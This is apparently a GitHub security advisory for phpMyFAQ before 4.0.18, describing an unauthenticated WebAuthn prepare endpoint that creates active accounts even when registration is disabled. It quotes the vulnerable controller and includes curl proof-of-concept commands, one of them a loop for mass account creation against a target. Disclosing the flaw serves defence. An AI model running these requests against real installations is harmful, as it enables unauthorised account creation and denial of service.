# [H] phpMyFAQ Allows Unauthenticated Account Creation via WebAuthn Prepare Endpoint

## Summary
Severity: High
Advisory: GHSA-w22q-m2fm-x9f4
CVE: CVE-2026-27836
CWE: CWE-862
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N (CVSS_V3)
Published: 2026-02-27
Source: https://github.com/advisories/GHSA-w22q-m2fm-x9f4
Type: github-advisory

## Affected
- Packagist: `thorsten/phpmyfaq` — affected >=0 <4.0.18

## Details
### Summary

The WebAuthn prepare endpoint (`/api/webauthn/prepare`) creates new active user accounts without any authentication, CSRF protection, CAPTCHA, or configuration checks. This allows unauthenticated attackers to create unlimited user accounts even when registration is disabled.

### Details

**File:** `phpmyfaq/src/phpMyFAQ/Controller/Frontend/Api/WebAuthnController.php`, lines 63-79

```php
#[Route(path: 'webauthn/prepare', name: 'api.private.webauthn.prepare', methods: ['POST'])]
public function prepare(Request $request): JsonResponse
{
    $data = json_decode($request->getContent(), ...);
    $username = Filter::filterVar($data->username, FILTER_SANITIZE_SPECIAL_CHARS);

    if (!$this->user->getUserByLogin($username, raiseError: false)) {
        try {
            $this->user->createUser($username);
            $this->user->setStatus(status: 'active');
            $this->user->setAuthSource(AuthenticationSourceType::AUTH_WEB_AUTHN->value);
            $this->user->setUserData([
                'display_name' => $username,
                'email' => $username,
            ]);
```

The endpoint:
1. Accepts any POST request with a JSON `username` field
2. If the username doesn't exist, creates a new **active** user account
3. Does NOT check if WebAuthn support is enabled (`security.enableWebAuthnSupport`)
4. Does NOT check if registration is enabled (`security.enableRegistration`)
5. Does NOT verify CSRF tokens
6. Does NOT require captcha validation
7. Has no rate limiting

### PoC

```bash
# Create an account - no auth needed
curl -X POST https://TARGET/api/webauthn/prepare \
  -H 'Content-Type: application/json' \
  -d '{"username":"attacker_account"}'

# Mass account creation
for i in $(seq 1 1000); do
  curl -s -X POST https://TARGET/api/webauthn/prepare \
    -H 'Content-Type: application/json' \
    -d "{\"username\":\"spam_user_$i"}" &
done
```

### Impact

- **Registration bypass:** Accounts created even when self-registration is disabled
- **Username squatting:** Reserve usernames before legitimate users
- **Database exhaustion:** Create millions of fake active accounts (DoS)
- **User enumeration:** Different responses for existing vs new usernames
- **Security control bypass:** WebAuthn config check is bypassed entirely

All phpMyFAQ installations with the WebAuthn controller routed (default) are affected, regardless of configuration settings.

## References
- https://github.com/thorsten/phpMyFAQ/security/advisories/GHSA-w22q-m2fm-x9f4
- https://nvd.nist.gov/vuln/detail/CVE-2026-27836
- https://github.com/thorsten/phpMyFAQ/commit/f2ab673f0668753cd0f7c7c8bc7fd2304dcf5cb1
- https://github.com/thorsten/phpMyFAQ
